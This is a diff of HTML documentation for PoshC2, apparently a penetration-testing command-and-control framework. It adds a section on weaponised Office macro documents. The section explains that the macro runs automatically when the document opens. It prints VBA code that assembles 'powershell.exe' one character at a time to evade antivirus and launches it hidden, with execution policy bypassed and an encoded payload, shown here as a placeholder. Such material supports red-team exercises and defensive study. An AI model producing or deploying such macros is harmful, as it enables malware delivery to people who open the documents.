@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -178,6 +179,61 @@
             
   <div class="section" id="macro-documents">
 <h1>Macro Documents<a class="headerlink" href="#macro-documents" title="Permalink to this headline">¶</a></h1>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1086">Powershell</a></p>
+<p>Office documents have been weaponised over the years utilising macros. PoshC2 creates a custom macro and embeds this into a Word Document, Excel Workbook and Powerpoint File. The VBScript called “powershell.exe” but slightly obfuscates the code to try and evade Anti-Virus scanners searching for the literal string “powershell.exe”.</p>
+<p>The macro is set to run on opening each document using “AutoRuns”, so when the document is opened, depending on the Macro settings on the target machine, the system will either automatically execute powershell or the user will have to accept the macro warning.</p>
+<p>The Macro code is shown below:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Sub</span> <span class="n">Auto_Open</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">AutoOpen</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">Workbook_Open</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">WorkbookOpen</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">Document_Open</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">DocumentOpen</span><span class="p">()</span>
+<span class="n">UpdateMacro</span>
+<span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Sub</span> <span class="n">UpdateMacro</span><span class="p">()</span>
+<span class="n">Dim</span> <span class="nb">str</span><span class="p">,</span> <span class="n">exec</span><span class="p">,</span> <span class="n">wsh</span>
+
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 payload merged across multiple lines&gt;&quot;</span>
+
+<span class="n">exec</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;o&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;w&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;e&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;r&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;s&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;h&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;e&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;l&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;l&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;e&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;x&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot;e&quot;</span>
+<span class="n">exec</span> <span class="o">=</span> <span class="n">exec</span> <span class="o">+</span> <span class="s2">&quot; -exec bypass -Noninteractive -windowstyle hidden -e &quot;</span> <span class="o">&amp;</span> <span class="nb">str</span>
+</pre></div>
+</div>
 </div>
 
 
